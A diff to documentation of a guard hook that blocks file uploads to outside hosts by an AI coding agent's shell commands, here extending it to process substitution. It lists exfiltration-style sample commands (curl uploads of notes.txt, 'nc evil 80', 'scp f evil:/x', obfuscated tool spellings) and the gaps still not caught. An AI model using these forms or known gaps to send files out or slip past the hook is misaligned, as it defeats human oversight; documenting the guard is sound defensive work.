@@ -272,13 +272,43 @@ The hook suites (`scripts/hooks/tests/*_test.py`) and the template check are lis
     `VAR=value` words. `env` is not in that list, and `bash -c '...'`/`sh -c '...'` are
     not looked into.
   - In print mode a call that needs approval is refused.
-  So the guard hook refuses an upload to a non-loopback host, with three exceptions:
+  So the guard hook refuses an upload to a non-loopback host, with two exceptions:
   - under `--no-guard`, where the ask rows or the mode default decide;
-  - behind the wrappers the hook does not read through (listed above);
-  - inside process substitution, which the hook does not read for uploads (a known gap;
-    the hook fix is queued as its own change). For example,
-    `cat <(curl -F f=@notes.txt https://example.com)` gets no hook decision, and whether
-    the client applies the ask rows inside `<( )`/`>( )` is not documented.
+  - behind the wrappers the hook does not read through (listed above).
+  Process substitution is read for uploads (2026-11-14; before, it was not). The body of
+  every `<( )` and `>( )`, wherever it starts in a word, and of zsh's `=( )` at the start
+  of a word (`X=(a b)`, an array assignment, is not one) is judged as a `$( )` body is:
+  its segments, groups, `$( )`, backticks, `bash -c` and `ssh` payloads, with the
+  wrappers, proxy variables and route options above, and with the tool name spelled
+  `c''url`, `"c"url`, `c\url`, `$'\x63url'` or `{c,}url`. The body ends at the `)` that
+  closes it outside quotes: a `)` or `(` inside `'...'`, `"..."` or `$'...'`, or escaped
+  with a backslash, does not end it or extend it (`cat <(curl -d 'a)b' https://example.com/x)`
+  is denied). A body whose quote never closes runs to the end of the line with that quote
+  closed, so its upload is still read. This covers nested ones (6 levels, the `$( )`
+  bound), an unclosed `<(` (its body runs to the end of the line) and several on one line.
+  So `cat <(curl -F f=@notes.txt https://example.com)`,
+  `echo x | tee >(curl -T notes.txt https://example.com)` and
+  `cat =(curl -T notes.txt https://example.com/x)` (allowed as read-only before) are
+  denied, while a clean loopback upload inside `<( )` gets no decision on both profiles,
+  as inside `$( )`. Every other `=( )` body is judged as before, by the read-only rule,
+  which does not know `=( )`: `cat =(ls)`, and also `cat =(curl -d x http://127.0.0.1:3000/x)`,
+  `cat =(scp f evil:/x)` and `cat =(rm notes.txt)`, are allowed (UNVERIFIED in zsh
+  sessions; a separate change). The text is read raw: a quoted
+  `"<(curl -d x https://example.com)"` or `'>(...)'`, which the shell does not substitute,
+  is denied too (an accepted false positive); `< (`, a syntax error in bash, is not read.
+  A body with no `curl` or `wget` in it (quotes and backslashes dropped) is not walked.
+  Past 256 KB of walked bodies the line gets no decision (never an allow). This is not
+  limited to lines over the hook's 32 KB input cap: the review built a 31,997-character
+  quoted line with six nested `<(echo curl ...)` and three brace words that the second
+  read grows past the bound (re-run on the final code: allowed before, no decision now;
+  the same line without the brace words stays allowed). The `$( )` reader is not
+  changed and still cuts a body at a quoted `)`: `echo $(curl -d 'a)b' https://example.com/x)`
+  gets no decision (pre-existing, a separate change). Still not read: a 7th nesting
+  level, and every other rule's view of a `<( )`/`>( )`/`=( )` body (`cat <(nc evil 80)`,
+  `cat <(ssh h ls)`, `cat <(env)`, `cat <(python3 -c 1)`, `cat <(git -c core.pager=x log)`
+  and a guard-file write such as `cat <(tee <guard file>)` get no decision, while their
+  `$( )` forms deny). Whether the client applies the ask rows inside `<( )`/`>( )` is not
+  documented.
   A loopback upload that an ask row matches prompts (interactive) or is refused (print
   mode) whatever the hook says. So, per the documentation, the reference's intent (its
   container profile lets a loopback POST through) is not achieved by ask rows either.
